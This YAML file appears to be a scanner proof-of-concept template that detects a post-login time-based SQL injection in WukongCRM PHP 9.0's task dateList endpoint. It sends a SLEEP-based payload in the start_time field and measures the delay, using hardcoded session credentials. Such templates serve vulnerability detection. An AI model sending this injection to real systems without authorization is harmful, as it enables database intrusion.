name: poc-yaml-wukongcrm-php9-datelist-sqli
binding: 71f8eddd-2311-422f-aa13-3454ff91d129
manual: true
detail:
    author: 10cker(https://github.com/10cker)
    links:
        - https://github.com/72wukong/72crm-9.0-PHP/issues/34
    vulnerability:
        id: CT-517501
        level: high
    description: |
        wukongcrm php 9.0 post-auth sqli
    check_action: need login, set `authKey` and `sessionId`
transport: http
set:
    sleepSecond: randomInt(5, 9)
    s1: randomLowercase(4)
    authKey: b"ac4f091909a555e773f874a781800ab0"
    sessionId: b"d3o7e9esol6r3roi9hksppu5b2"
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /index.php/work/task/dateList
            headers:
                Content-Type: application/json
                authKey: '{{authKey}}'
                sessionId: '{{sessionId}}'
            body: '{"start_time":"1","stop_time":"1"}'
        expression: response.status == 200 && response.headers["Content-Type"].contains("json")
        output:
            r0latency: response.latency
    r1:
        request:
            cache: true
            method: POST
            path: /index.php/work/task/dateList
            headers:
                Content-Type: application/json
                authKey: '{{authKey}}'
                sessionId: '{{sessionId}}'
            body: '{"start_time":"1 AND (SELECT 1 FROM (SELECT(SLEEP({{sleepSecond}}))){{s1}})","stop_time":"1"}'
        expression: response.latency - r0latency >= sleepSecond * 1000 - 500
expression: r0() && r1()
